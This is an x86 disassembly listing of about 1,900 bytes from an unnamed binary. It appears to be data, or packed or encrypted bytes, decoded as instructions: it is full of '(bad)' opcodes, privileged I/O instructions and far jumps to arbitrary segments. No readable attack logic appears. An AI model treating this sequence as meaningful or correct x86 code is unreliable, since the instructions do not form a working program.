  4204c7:	jne    0x4204fd
  4204c9:	xor    bl,bl
  4204cb:	lock out dx,eax
  4204cd:	push   edi
  4204ce:	xchg   esi,eax
  4204cf:	pusha  
  4204d0:	retf   0xe42d
  4204d3:	push   0xffffffdb
  4204d5:	adc    eax,DWORD PTR [esi+0x71023cbd]
  4204db:	xchg   esi,eax
  4204dc:	(bad)  
  4204de:	and    edi,DWORD PTR [esi]
  4204e0:	mov    cl,0x9
  4204e2:	cmp    eax,0xed800bc9
  4204e7:	push   esp
  4204e8:	fucomip st,st(1)
  4204ea:	pop    ebp
  4204eb:	lds    edi,FWORD PTR [edx]
  4204ed:	call   0x7fb2:0x4c430e71
  4204f4:	mov    edi,0x4b2da09
  4204f9:	(bad)  
  4204fb:	dec    ebp
  4204fc:	push   esi
  4204fd:	or     ebp,DWORD PTR [ebx]
  4204ff:	sub    al,0x9d
  420501:	lods   eax,DWORD PTR ds:[esi]
  420502:	xor    BYTE PTR [eax-0x7],cl
  420505:	pop    ebp
  420506:	adc    cl,BYTE PTR [eax-0x46]
  420509:	jge    0x420579
  42050b:	int    0xc7
  42050d:	mov    DWORD PTR gs:[eax],esp
  420510:	inc    ecx
  420511:	repnz ffreep st(3)
  420514:	mov    edi,0x32eff8a5
  420519:	cmp    al,0xce
  42051b:	into   
  42051c:	pop    edi
  42051d:	push   edi
  42051e:	sub    ebp,DWORD PTR [eax+0x2a93fb3e]
  420524:	stos   BYTE PTR es:[edi],al
  420525:	fidiv  WORD PTR [ebp+0x3b]
  420528:	and    DWORD PTR [ebx],edi
  42052a:	mov    DWORD PTR [edx-0x2ae16c67],ebx
  420530:	hlt    
  420531:	mov    eax,0x9a8180ec
  420536:	test   DWORD PTR [eax+eax*1],edx
  420539:	and    al,BYTE PTR [ecx+0x2e]
  42053c:	std    
  42053d:	loope  0x420552
  42053f:	mov    bh,0x5e
  420541:	call   0x1041:0x68314024
  420548:	pop    ebp
  420549:	xchg   esp,eax
  42054a:	or     BYTE PTR [ecx-0x6a9b88a9],bh
  420550:	jb     0x4204d7
  420552:	jmp    0x4dcd:0xb9db365b
  420559:	dec    ecx
  42055a:	xchg   ecx,eax
  42055b:	mov    dh,BYTE PTR cs:[ecx-0x2e]
  42055f:	xchg   edx,eax
  420560:	xchg   BYTE PTR [esi-0x4c6a4570],cl
  420566:	dec    BYTE PTR [eax]
  420568:	mov    eax,ds:0x45d6ecf8
  42056d:	mov    al,ds:0x86d8b6bf
  420572:	dec    edx
  420573:	mov    ds:0x1994396f,al
  420578:	fidiv  WORD PTR [edi+0x6891631e]
  42057e:	or     cl,BYTE PTR [edx-0x69ca6414]
  420584:	inc    esp
  420585:	outs   dx,BYTE PTR ds:[esi]
  420586:	mov    edi,0x4d15e2b8
  42058b:	mov    eax,0xf149570f
  420590:	and    DWORD PTR [ebp+edx*8+0x62],ecx
  420594:	in     al,0xa3
  420596:	test   DWORD PTR ds:0x8827ee96,edx
  42059c:	call   0xc572:0x14c5480a
  4205a3:	fs iret 
  4205a5:	lods   eax,DWORD PTR ds:[esi]
  4205a6:	shl    dl,0xcc
  4205a9:	inc    edi
  4205aa:	(bad)  
  4205ab:	js     0x4205b7
  4205ad:	aam    0xf7
  4205af:	rcr    DWORD PTR [ebp+0x5d],cl
  4205b2:	xor    ch,BYTE PTR [esi]
  4205b4:	daa    
  4205b5:	push   ds
  4205b6:	inc    ebp
  4205b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205b8:	imul   esp,DWORD PTR [edx+0x40],0xffffffde
  4205bc:	fs and al,0x25
  4205bf:	add    al,bh
  4205c1:	fmul   st,st(4)
  4205c3:	dec    ebp
  4205c4:	sub    ebp,DWORD PTR [edi+0x43dd2503]
  4205ca:	clc    
  4205cb:	pop    es
  4205cc:	inc    ebx
  4205cd:	lahf   
  4205ce:	cwde   
  4205cf:	gs (bad) 
  4205d1:	out    0xe9,al
  4205d3:	(bad)  
  4205d4:	jbe    0x42064c
  4205d6:	lods   eax,DWORD PTR ds:[esi]
  4205d7:	iret   
  4205d8:	lea    edx,[edi+0x454edb75]
  4205de:	mov    edi,0xa11ab411
  4205e3:	dec    edx
  4205e4:	fwait
  4205e5:	jno    0x420568
  4205e7:	stos   BYTE PTR es:[edi],al
  4205e8:	adc    DWORD PTR [edx-0x2379a7bd],edx
  4205ee:	pop    esp
  4205ef:	mov    eax,ds:0x93df40a4
  4205f4:	jl     0x42057a
  4205f6:	add    eax,DWORD PTR [edi]
  4205f8:	out    dx,al
  4205f9:	(bad)  
  4205fa:	jecxz  0x4205d2
  4205fc:	andnps xmm4,XMMWORD PTR [ecx-0x5d]
  420600:	test   al,0x87
  420602:	push   edi
  420603:	jecxz  0x42061c
  420605:	sbb    eax,0x53f37c6d
  42060a:	sub    eax,0xe2f401f4
  42060f:	jg     0x420595
  420611:	mov    ds:0xbca6a37d,eax
  420616:	test   BYTE PTR [ebx+0x43e3b0f8],cl
  42061c:	pop    ebp
  42061d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42061e:	jp     0x420645
  420620:	or     eax,0xc5ef35c8
  420625:	add    BYTE PTR [edi],0xdb
  420628:	lahf   
  420629:	leave  
  42062a:	enter  0xbc66,0xc9
  42062e:	xlat   BYTE PTR ds:[ebx]
  42062f:	and    esp,edi
  420631:	sub    eax,0x4f456082
  420636:	mov    DWORD PTR [edi-0x3],esp
  420639:	and    BYTE PTR [edi-0x40],0xeb
  42063d:	stos   DWORD PTR es:[edi],eax
  42063e:	ins    BYTE PTR es:[edi],dx
  42063f:	jns    0x4206aa
  420641:	js     0x4205d4
  420643:	call   FWORD PTR [ecx+0xe2e71b8]
  420649:	(bad)  
  42064a:	push   ecx
  42064b:	sub    ebp,0xffffff9e
  42064e:	stos   BYTE PTR es:[edi],al
  42064f:	(bad)  
  420650:	rol    esp,1
  420652:	cmp    ebx,DWORD PTR [esi+0x58bb2e14]
  420658:	mov    cl,0xe
  42065a:	and    al,0x97
  42065c:	sub    al,BYTE PTR [eax+edx*1-0x41e3ca39]
  420663:	xchg   ebx,eax
  420664:	neg    DWORD PTR [eax+eiz*4+0x14]
  420668:	mov    ecx,0x5c9c25da
  42066d:	and    BYTE PTR gs:[edi-0x3b],bh
  420671:	ret    0x181f
  420674:	pop    ebx
  420675:	jo     0x4206b1
  420677:	push   edx
  420678:	cmp    edi,ecx
  42067a:	repz stc 
  42067c:	jle    0x4206ee
  42067e:	xchg   esi,eax
  42067f:	lds    esp,FWORD PTR [edx+ecx*1+0x20]
  420683:	mov    ds:0x7d4a33d7,al
  420688:	pop    es
  420689:	call   0xc35d:0x5e16dcf6
  420690:	fmul   QWORD PTR [ebx-0x16]
  420693:	addr16 hlt 
  420695:	and    BYTE PTR gs:[esi+ecx*2-0x40c934fb],0xf6
  42069e:	pop    eax
  42069f:	push   ebp
  4206a0:	test   eax,0x3e5fb133
  4206a5:	cs ret 0x7e27
  4206a9:	shl    DWORD PTR [ebx],0x52
  4206ac:	cmp    esp,ecx
  4206ae:	in     al,0xf7
  4206b0:	in     al,dx
  4206b1:	popf   
  4206b2:	fucomi st,st(7)
  4206b4:	dec    edi
  4206b5:	cmp    BYTE PTR [edi-0x6d],dh
  4206b8:	mov    ds:0x446469da,al
  4206bd:	adc    BYTE PTR [eax+0x59],ah
  4206c0:	cs pusha 
  4206c2:	adc    DWORD PTR [edi],edi
  4206c4:	repz inc ecx
  4206c6:	and    esp,DWORD PTR [ecx]
  4206c8:	xor    DWORD PTR fs:[ebx],ecx
  4206cb:	popa   
  4206cc:	cld    
  4206cd:	mov    ah,0x10
  4206cf:	xchg   esi,eax
  4206d0:	and    al,0xe1
  4206d2:	cs mov esp,0x13354ccb
  4206d8:	cli    
  4206d9:	out    0xd3,eax
  4206db:	stos   DWORD PTR es:[edi],eax
  4206dc:	mov    ah,0x21
  4206de:	or     al,0x89
  4206e0:	ss sahf 
  4206e2:	adc    eax,0x7d2c83e9
  4206e7:	push   ecx
  4206e8:	push   eax
  4206e9:	daa    
  4206ea:	repz xchg edx,eax
  4206ec:	dec    eax
  4206ed:	jmp    0x42070f
  4206ef:	push   ecx
  4206f0:	repz enter 0x7b42,0xa8
  4206f5:	popa   
  4206f6:	add    DWORD PTR [ebx],ecx
  4206f8:	pop    ds
  4206f9:	adc    DWORD PTR [ebp+0x6e8563f],edx
  4206ff:	push   ds
  420700:	ins    BYTE PTR es:[edi],dx
  420701:	cmc    
  420702:	data16 js 0x4206e4
  420705:	mov    ds:0xdaf534ad,al
  42070a:	test   al,0x1a
  42070c:	stc    
  42070d:	push   ebx
  42070e:	pop    edi
  42070f:	and    eax,0x43de3cd3
  420714:	addps  xmm0,XMMWORD PTR [ebp+0x65325e33]
  42071b:	mov    edi,0x869d26d4
  420720:	sbb    dh,BYTE PTR [esi+0x14]
  420723:	fild   WORD PTR ds:0x1d3214d1
  420729:	daa    
  42072a:	call   0xea1:0x2d1eef8d
  420731:	xor    BYTE PTR [ebp+0x4849be43],al
  420737:	lods   eax,DWORD PTR ds:[esi]
  420738:	mov    BYTE PTR [ecx+edi*1],ah
  42073b:	mov    ds:0xd2833ae,eax
  420740:	test   ecx,edi
  420742:	fdivr  QWORD PTR [ebx+ebx*8+0x26]
  420746:	add    ch,BYTE PTR [edi+0x65]
  420749:	mov    dl,0xc4
  42074b:	inc    edx
  42074c:	fbld   TBYTE PTR [ebp+0x41]
  42074f:	repz pop ss
  420751:	pop    es
  420752:	mov    cl,0x58
  420754:	xor    BYTE PTR [ecx],bh
  420756:	mov    eax,ds:0xb8003eaa
  42075b:	inc    esp
  42075c:	jle    0x420770
  42075e:	sub    cl,BYTE PTR ds:[ebx]
  420761:	inc    DWORD PTR [edi-0x3b27e208]
  420767:	cmp    edx,DWORD PTR [edx-0xafcb86c]
  42076d:	shl    DWORD PTR [edi+ebp*4+0x6db38f8c],0x72
  420775:	push   0xffffffa9
  420777:	loope  0x420713
  420779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42077a:	pop    ebx
  42077b:	jmp    0x2df6:0xc6a01b5d
  420782:	xor    al,0x7b
  420784:	push   ecx
  420785:	push   ebp
  420786:	sub    ecx,ebx
  420788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420789:	ret    
  42078a:	push   ebx
  42078b:	pushf  
  42078c:	mov    esi,0x23430b6c
  420791:	pop    edi
  420792:	adc    eax,0xfd989991
  420797:	add    al,0x50
  420799:	arpl   WORD PTR [esi],dx
  42079b:	xor    DWORD PTR [ebp+0x6be46de4],edi
  4207a1:	ins    DWORD PTR es:[edi],dx
  4207a2:	xchg   esp,eax
  4207a3:	push   edx
  4207a4:	outs   dx,BYTE PTR ds:[esi]
  4207a5:	adc    BYTE PTR [ecx+0x51],bl
  4207a8:	mov    WORD PTR [ebx],ss
  4207aa:	lock dec esp
  4207ac:	mov    esi,ebp
  4207ae:	test   ecx,esp
  4207b0:	into   
  4207b1:	xchg   DWORD PTR [ecx+0x3f],esp
  4207b4:	retf   0x7dcb
  4207b7:	ret    
  4207b8:	or     eax,0xf754b79c
  4207bd:	push   ecx
  4207be:	mov    dl,bl
  4207c0:	neg    dl
  4207c2:	push   edi
  4207c3:	hlt    
  4207c4:	cmp    al,0x71
  4207c6:	adc    bh,BYTE PTR [ebp+edi*2-0x2b]
  4207ca:	shl    BYTE PTR [ebx+0x3b],1
  4207cd:	inc    ecx
  4207ce:	lods   eax,DWORD PTR ds:[esi]
  4207cf:	(bad)  
  4207d0:	enter  0x607c,0xe1
  4207d4:	add    BYTE PTR [edi-0x69],ah
  4207d7:	mov    ah,0x2d
  4207d9:	mov    al,ds:0xe5ec2f18
  4207de:	lods   al,BYTE PTR ds:[esi]
  4207df:	hlt    
  4207e0:	enter  0xe6dc,0xd
  4207e4:	xchg   edx,eax
  4207e5:	stos   DWORD PTR es:[edi],eax
  4207e6:	cmp    bh,dh
  4207e8:	cvtpi2ps xmm0,mm6
  4207eb:	sbb    DWORD PTR [ebp-0x77a1b41],eax
  4207f1:	hlt    
  4207f2:	xchg   DWORD PTR [ebp-0x2f],esp
  4207f5:	inc    ebx
  4207f6:	out    dx,al
  4207f7:	icebp  
  4207f8:	pop    ss
  4207f9:	lea    edi,[esi]
  4207fb:	imul   DWORD PTR [esi+0xa]
  4207fe:	pop    ds
  4207ff:	fcom   DWORD PTR [ebp+0x1a]
  420802:	loop   0x420852
  420804:	imul   edx,DWORD PTR [ebx-0x70e2f3b5],0x52821c67
  42080e:	add    ah,BYTE PTR [esi+0x62]
  420811:	lahf   
  420812:	rcl    DWORD PTR [esi-0xc5f9aeb],cl
  420818:	and    ebx,ebx
  42081a:	imul   ebp,DWORD PTR [ecx-0x4be56e72],0x13
  420821:	sahf   
  420822:	pop    ds
  420823:	repz adc al,0xd2
  420826:	mov    WORD PTR [ecx-0x1a],gs
  420829:	jle    0x420876
  42082b:	pop    es
  42082c:	aas    
  42082d:	adc    al,BYTE PTR [ebx+0x16b5b3b3]
  420833:	or     bh,cl
  420835:	outs   dx,BYTE PTR ds:[esi]
  420836:	fxch   st(2)
  420838:	dec    edi
  420839:	aas    
  42083a:	mov    dh,0xac
  42083c:	xchg   BYTE PTR [edx],cl
  42083e:	or     ebx,edi
  420840:	xchg   esp,eax
  420841:	int    0x27
  420843:	hlt    
  420844:	inc    edi
  420845:	bound  edi,QWORD PTR [ecx+0x28]
  420848:	and    al,0x13
  42084a:	pop    edx
  42084b:	popf   
  42084c:	pop    esi
  42084d:	mov    bh,0xcf
  42084f:	ror    DWORD PTR [esi],1
  420851:	ss dec esi
  420853:	fist   DWORD PTR [ecx-0x66f0bcfa]
  420859:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085a:	sbb    BYTE PTR [edi-0x5e64a29b],0x21
  420861:	out    dx,al
  420862:	jbe    0x420801
  420864:	stos   DWORD PTR es:[edi],eax
  420865:	loope  0x420890
  420867:	xchg   esp,eax
  420868:	sub    ecx,edx
  42086a:	xchg   ebx,eax
  42086b:	cs cmp esp,ecx
  42086e:	dec    ebp
  42086f:	ficomp DWORD PTR [bx+di+0x6d9d]
  420874:	pop    edx
  420875:	xor    ah,bl
  420877:	test   BYTE PTR [edi-0x4c],bh
  42087a:	and    ah,BYTE PTR [ebx+0x70f29df6]
  420880:	outs   dx,BYTE PTR ds:[esi]
  420881:	sahf   
  420882:	lods   al,BYTE PTR ds:[esi]
  420883:	jno    0x42083f
  420885:	and    DWORD PTR [edi],esi
  420887:	pop    es
  420888:	sbb    DWORD PTR [edx],ebp
  42088a:	imul   eax,DWORD PTR [esi-0x70],0x3965661c
  420891:	adc    eax,0x745de461
  420896:	(bad)  
  420898:	and    DWORD PTR [ecx-0x58],eax
  42089b:	sbb    al,ch
  42089d:	lds    edx,FWORD PTR [ebx-0x14]
  4208a0:	rol    DWORD PTR [ebx-0x60e1c5e5],0xf6
  4208a7:	cmp    al,0xca
  4208a9:	scas   eax,DWORD PTR es:[edi]
  4208aa:	sbb    al,0xf4
  4208ac:	sbb    BYTE PTR [ebx+ebp*4],ch
  4208af:	and    eax,0xacfb27c1
  4208b4:	xchg   ebx,eax
  4208b5:	jge    0x4208e9
  4208b7:	adc    al,dh
  4208b9:	dec    edi
  4208ba:	pop    ebx
  4208bb:	scas   al,BYTE PTR es:[edi]
  4208bc:	shr    ebx,cl
  4208be:	jne    0x42091b
  4208c0:	int3   
  4208c1:	rol    BYTE PTR [edx],cl
  4208c3:	adc    ah,BYTE PTR [eax]
  4208c5:	gs sub ebx,edi
  4208c8:	sub    ebp,DWORD PTR [ecx]
  4208ca:	pop    edi
  4208cb:	inc    esi
  4208cc:	mov    cs,WORD PTR [edi]
  4208ce:	(bad)  
  4208cf:	es sub dh,dh
  4208d2:	xor    dl,BYTE PTR [edi+eiz*4]
  4208d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208d6:	setb   BYTE PTR [edi+0x7c]
  4208da:	mov    ecx,0xaa82fa0
  4208df:	dec    esp
  4208e0:	stos   BYTE PTR es:[edi],al
  4208e1:	xchg   ecx,eax
  4208e2:	fsin   
  4208e4:	popf   
  4208e5:	add    dl,BYTE PTR [esi+0x39]
  4208e8:	pop    esp
  4208e9:	mov    ch,BYTE PTR [edi-0xc1a915e]
  4208ef:	sub    dl,cl
  4208f1:	xchg   ebx,eax
  4208f2:	std    
  4208f3:	lock xchg BYTE PTR fs:[esi],dl
  4208f7:	push   ds
  4208f8:	sub    ebx,esp
  4208fa:	daa    
  4208fb:	or     eax,0xfe13a40
  420900:	pop    edi
  420901:	mov    eax,ds:0xb3812097
  420906:	jne    0x420894
  420908:	sbb    dl,BYTE PTR [edx]
  42090a:	inc    ebx
  42090b:	repnz out 0xf9,eax
  42090e:	bound  edx,QWORD PTR [esi+0x33763f6e]
  420914:	mov    ds:0xde36b98b,eax
  420919:	ror    BYTE PTR [ecx-0x55],0x7f
  42091d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42091e:	pop    ecx
  42091f:	call   0xcfa4a91c
  420924:	cmp    al,cl
  420926:	in     al,dx
  420927:	xchg   edi,eax
  420928:	jae    0x42097e
  42092a:	jecxz  0x42093f
  42092c:	xlat   BYTE PTR ds:[ebx]
  42092d:	ror    DWORD PTR [edx+0x2aef97f1],1
  420933:	stc    
  420934:	inc    edx
  420935:	cld    
  420936:	(bad)  [ecx]
  420938:	pushf  
  420939:	xor    cl,al
  42093b:	stc    
  42093c:	fbld   TBYTE PTR [edi+0x7c9df906]
  420942:	out    dx,eax
  420943:	into   
  420944:	int    0xe3
  420946:	xchg   BYTE PTR [edi],al
  420948:	xchg   BYTE PTR [edx+ebp*1-0x7167487],ah
  42094f:	pop    edi
  420950:	jmp    0x2a4916b2
  420955:	test   ebx,ebx
  420957:	mov    al,0x58
  420959:	lods   al,BYTE PTR ds:[esi]
  42095a:	cdq    
  42095b:	iret   
  42095c:	mov    ah,0x50
  42095e:	xor    dl,bh
  420960:	ror    DWORD PTR [edi],1
  420962:	mov    dl,0x98
  420964:	cli    
  420965:	mov    al,ds:0x91dc489b
  42096a:	xchg   ecx,eax
  42096b:	xchg   ecx,eax
  42096c:	mov    esi,0x4b5112b1
  420971:	es cs in al,0x56
  420975:	mov    ah,dl
  420977:	fistp  WORD PTR [ebp+0x19]
  42097a:	pop    esp
  42097b:	stc    
  42097c:	mov    ch,0xf4
  42097e:	test   DWORD PTR [esi+0x67],ebp
  420981:	fsub   st,st(3)
  420983:	or     di,WORD PTR [ecx]
  420986:	ja     0x420986
  420988:	retf   
  420989:	jno    0x4209f2
  42098b:	sub    BYTE PTR [ebx],ah
  42098d:	gs sbb dh,dl
  420990:	xchg   esi,eax
  420991:	mov    DWORD PTR [eax-0x1d],esp
  420994:	sub    bl,BYTE PTR ds:0x5f6e6d93
  42099a:	inc    BYTE PTR [ebx]
  42099c:	icebp  
  42099d:	cwde   
  42099e:	fiadd  WORD PTR ds:0x94d654f
  4209a4:	push   esi
  4209a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209a6:	mov    ds:0xb9f20b5a,al
  4209ab:	push   edi
  4209ac:	mov    cl,0xa7
  4209ae:	sti    
  4209af:	arpl   WORD PTR [esp+ecx*8],bx
  4209b2:	xchg   esi,eax
  4209b3:	dec    eax
  4209b4:	mov    eax,0xdf0ee9c6
  4209b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ba:	out    0x33,al
  4209bc:	call   0x743d:0xb82f6d58
  4209c3:	dec    edx
  4209c4:	shl    DWORD PTR [edi],cl
  4209c6:	push   ds
  4209c7:	ja     0x420a01
  4209c9:	repz xchg ebp,esi
  4209cc:	push   esi
  4209cd:	shl    bh,1
  4209cf:	into   
  4209d0:	ss enter 0x608a,0xc3
  4209d5:	dec    ebx
  4209d6:	std    
  4209d7:	mov    edi,0xfffcee41
  4209dc:	cdq    
  4209dd:	shl    BYTE PTR [eax-0x43],cl
  4209e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209e1:	sub    al,0xdc
  4209e3:	imul   edi,DWORD PTR [edx],0x1b6f4f74
  4209e9:	dec    esi
  4209ea:	jp     0x4209b3
  4209ec:	push   es
  4209ed:	pop    ebp
  4209ee:	push   esi
  4209ef:	icebp  
  4209f0:	pushf  
  4209f1:	xchg   edi,eax
  4209f2:	jns    0x420a27
  4209f4:	cs pop eax
  4209f6:	jecxz  0x4209ef
  4209f8:	lods   al,BYTE PTR ds:[esi]
  4209f9:	sbb    BYTE PTR [ecx],dh
  4209fb:	in     al,0xd7
  4209fd:	mov    bh,0x21
  4209ff:	push   DWORD PTR [ecx-0x7f0b00b4]
  420a05:	or     ah,BYTE PTR [ebx+ebp*8]
  420a08:	pop    es
  420a09:	out    dx,al
  420a0a:	call   0x2f888b02
  420a0f:	mov    ds:0x7996d1fe,eax
  420a14:	sti    
  420a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a16:	(bad)  
  420a18:	mov    dl,0x59
  420a1a:	pop    es
  420a1b:	and    eax,0xac99eb02
  420a20:	cmp    BYTE PTR [edx+0x4ab9caad],bl
  420a26:	and    ch,BYTE PTR [esi+ecx*1+0x523fab00]
  420a2d:	mov    edx,0x3a9055f9
  420a32:	retf   
  420a33:	cdq    
  420a34:	shr    BYTE PTR [ebp-0x59],cl
  420a37:	aad    0x2
  420a39:	(bad)  
  420a3a:	pop    esi
  420a3b:	sti    
  420a3c:	jae    0x4209fa
  420a3e:	mov    ch,0x98
  420a40:	add    eax,0x8fc4dd0e
  420a45:	lock mov eax,ds:0xeff200e9
  420a4b:	or     al,0x98
  420a4d:	lock pop eax
  420a4f:	aad    0x92
  420a51:	fcmovnu st,st(6)
  420a53:	popa   
  420a54:	xor    DWORD PTR [esi],ebp
  420a56:	fwait
  420a57:	push   0xffffffc3
  420a59:	pop    ecx
  420a5a:	push   cx
  420a5c:	sub    edx,DWORD PTR [ebx+0x650e2591]
  420a62:	mov    dh,0x93
  420a64:	cdq    
  420a65:	mov    ds:0x3665d072,eax
  420a6a:	pop    esi
  420a6b:	out    dx,eax
  420a6c:	out    0x92,eax
  420a6e:	push   eax
  420a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a70:	rcr    DWORD PTR [eax+0x3a],0x5a
  420a74:	jo     0x420a6d
  420a76:	jmp    DWORD PTR [eax]
  420a78:	push   ds
  420a79:	sub    DWORD PTR [ebx],esp
  420a7b:	or     DWORD PTR [edx],ebp
  420a7d:	fs sbb al,0x8e
  420a80:	jno    0x420ad0
  420a82:	pop    ecx
  420a83:	jne    0x420ade
  420a85:	fadd   st,st(0)
  420a87:	xor    al,0x43
  420a89:	mov    BYTE PTR [edi+0x6ffbb16a],0x2a
  420a90:	cmp    BYTE PTR [ebp+0x22b6bc68],0xd8
  420a97:	mov    bl,cl
  420a99:	mov    bl,0xa4
  420a9b:	inc    eax
  420a9c:	iret   
  420a9d:	sbb    eax,0xedc537ba
  420aa2:	pop    ss
  420aa3:	sbb    ah,dh
  420aa5:	data16 icebp 
  420aa7:	leave  
  420aa8:	xchg   esi,eax
  420aa9:	and    esi,edx
  420aab:	jno    0x420a89
  420aad:	js     0x420a2f
  420aaf:	and    ebx,eax
  420ab1:	pop    esi
  420ab2:	je     0x420a46
  420ab4:	mov    WORD PTR [esi+ecx*4+0x656801a7],?
  420abb:	jmp    0x5ec7:0xb494136c
  420ac2:	pusha  
  420ac3:	inc    ebp
  420ac4:	lods   al,BYTE PTR ds:[esi]
  420ac5:	mov    fs,WORD PTR [edx]
  420ac7:	add    edi,ecx
  420ac9:	mov    esi,0xebf3ed6e
  420ace:	mov    esp,0x1453cbdc
  420ad3:	xor    BYTE PTR [ebp-0x7d],al
  420ad6:	mov    ah,0xf6
  420ad8:	outs   dx,DWORD PTR ds:[esi]
  420ad9:	mov    ebp,0xbc7bb03d
  420ade:	and    al,0xa6
  420ae0:	sub    ebp,esp
  420ae2:	push   ds
  420ae3:	mov    ebp,0xbf9ccf1
  420ae8:	push   es
  420ae9:	mov    WORD PTR [eax+ebp*1-0x5fe182ef],?
  420af0:	mov    esi,0xf2efa099
  420af5:	push   cs
  420af6:	mov    ebp,0x68987324
  420afb:	mov    esp,0x15e279ee
  420b00:	js     0x420b70
  420b02:	hlt    
  420b03:	xchg   ecx,esp
  420b05:	(bad)  
  420b06:	stos   BYTE PTR es:[edi],al
  420b07:	and    ebp,DWORD PTR ds:0xe08c8e4
  420b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b0e:	pop    ebx
  420b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b10:	jae    0x420aac
  420b12:	push   0xb4d14c55
  420b17:	mov    BYTE PTR [edx+edi*4-0x11c9c9d2],bh
  420b1e:	jge    0x420b02
  420b20:	mov    al,ds:0xc2efe9c0
  420b25:	pop    edx
  420b26:	test   BYTE PTR [esi-0x5ea2c0cf],dl
  420b2c:	sbb    dh,BYTE PTR [ebx-0x73]
  420b2f:	jns    0x420b8a
  420b31:	xor    BYTE PTR [ecx],al
  420b33:	xchg   ecx,eax
  420b34:	jns    0x420b3b
  420b36:	mov    edi,gs
  420b38:	add    eax,0xf37cee46
  420b3d:	les    esi,FWORD PTR [ecx-0x38]
  420b40:	inc    eax
  420b41:	sbb    al,0x45
  420b43:	mov    al,0x6e
  420b45:	sub    bh,BYTE PTR [ecx-0x1b]
  420b48:	pushf  
  420b49:	ins    BYTE PTR es:[edi],dx
  420b4a:	jg     0x420b7c
  420b4c:	and    bl,al
  420b4e:	mov    eax,ds:0xb25d2bd6
  420b53:	dec    eax
  420b54:	cld    
  420b55:	cmp    eax,0x9adfd3ff
  420b5a:	dec    edi
  420b5b:	lods   al,BYTE PTR ds:[esi]
  420b5c:	fsubr  DWORD PTR [edi+0x3f]
  420b5f:	out    dx,eax
  420b60:	(bad)  
  420b61:	pop    ds
  420b62:	sub    eax,0x8a902d3e
  420b67:	xchg   edi,eax
  420b68:	in     al,0x98
  420b6a:	shl    DWORD PTR [ebx-0x3f],1
  420b6d:	sub    al,0x77
  420b6f:	leave  
  420b70:	fs enter 0xc9f2,0xf0
  420b75:	clc    
  420b76:	in     al,dx
  420b77:	jae    0x420b7e
  420b79:	cmp    edx,edi
  420b7b:	pop    ds
  420b7c:	mov    ds:0x416cbdf2,eax
  420b81:	int3   
  420b82:	sbb    al,ch
  420b84:	sbb    esi,DWORD PTR [ebp+edi*8+0x30]
  420b88:	ds mov al,0xf6
  420b8b:	call   0x3f59a8dd
  420b90:	or     DWORD PTR [ecx+edi*2-0x4c],ecx
  420b94:	ins    DWORD PTR es:[edi],dx
  420b95:	mov    dl,0xd8
  420b97:	cld    
  420b98:	jge    0x420b7a
  420b9a:	lock jns 0x420bf8
  420b9d:	sub    BYTE PTR [ebp-0x1c],cl
  420ba0:	jecxz  0x420b43
  420ba2:	push   cs
  420ba3:	stos   DWORD PTR es:[edi],eax
  420ba4:	xchg   DWORD PTR [ecx],ecx
  420ba6:	mov    ah,dl
  420ba8:	xor    al,0x93
  420baa:	inc    esp
  420bab:	push   0xfffffff6
  420bad:	or     bl,dl
  420baf:	cli    
  420bb0:	lods   al,BYTE PTR ds:[esi]
  420bb1:	mov    ds:0x15c6c3,al
  420bb6:	adc    BYTE PTR [esi],ch
  420bb8:	dec    esp
  420bb9:	into   
  420bba:	fldcw  WORD PTR [esi+0x5e]
  420bbd:	jns    0x420ba9
  420bbf:	xor    eax,0xd9e8f430
  420bc4:	pop    es
  420bc5:	push   ebx
  420bc6:	(bad)  
  420bc7:	in     al,0x28
  420bc9:	dec    ecx
  420bca:	mov    bh,0xcb
  420bcc:	mov    cl,0x9
  420bce:	adc    DWORD PTR [edi],0xffffff91
  420bd1:	push   DWORD PTR [edx-0x7bcf5575]
  420bd7:	int3   
  420bd8:	out    0x1a,eax
  420bda:	fs out dx,al
  420bdc:	sub    edi,esp
  420bde:	inc    esp
  420bdf:	cmp    eax,0xb2e1e9af
  420be4:	es (bad) 
  420be6:	xchg   ecx,eax
  420be7:	loop   0x420bce
  420be9:	test   DWORD PTR [edi-0x52],ecx
  420bec:	loop   0x420b86
  420bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bef:	dec    ebx
  420bf0:	sbb    eax,0x567bff25
  420bf5:	nop
  420bf6:	and    BYTE PTR [ecx-0xd77b401],cl
  420bfc:	adc    al,0x1d
  420bfe:	lds    esp,FWORD PTR [edi+0x2a]
  420c01:	jg     0x420bbd
  420c03:	pusha  
  420c04:	jmp    0x58d5:0xd6f3b5ae
  420c0b:	into   
  420c0c:	adc    DWORD PTR [bx+0x32],0x5b
  420c11:	xchg   esi,eax
  420c12:	add    ah,BYTE PTR [eax]
  420c14:	mov    al,0x65
  420c16:	mov    ah,cl
  420c18:	push   ss
  420c19:	and    al,ch
  420c1b:	in     eax,dx
  420c1c:	and    eax,DWORD PTR [esi-0x52]
  420c1f:	imul   eax,DWORD PTR [ebp+0x1d8ebc3d],0x3ca378d9
  420c29:	sub    al,ah
  420c2b:	retf   0x7ac
  420c2e:	adc    eax,0x651683ef
  420c33:	cld    
  420c34:	mov    ebx,0xb9821625
  420c39:	push   edi
  420c3a:	cli    
  420c3b:	outs   dx,DWORD PTR ds:[esi]
  420c3c:	ss iret 
  420c3e:	hlt    
  420c3f:	push   ecx
  420c40:	adc    BYTE PTR [edx+edi*4+0x6a9caa2a],ah
  420c47:	mov    ecx,DWORD PTR [edi-0x6cd5a0ff]
  420c4d:	fwait
  420c4e:	mov    bh,BYTE PTR [ebp-0x37]
  420c51:	inc    ebp
  420c52:	ins    DWORD PTR es:[edi],dx
  420c53:	pop    ecx
  420c54:	pop    esp
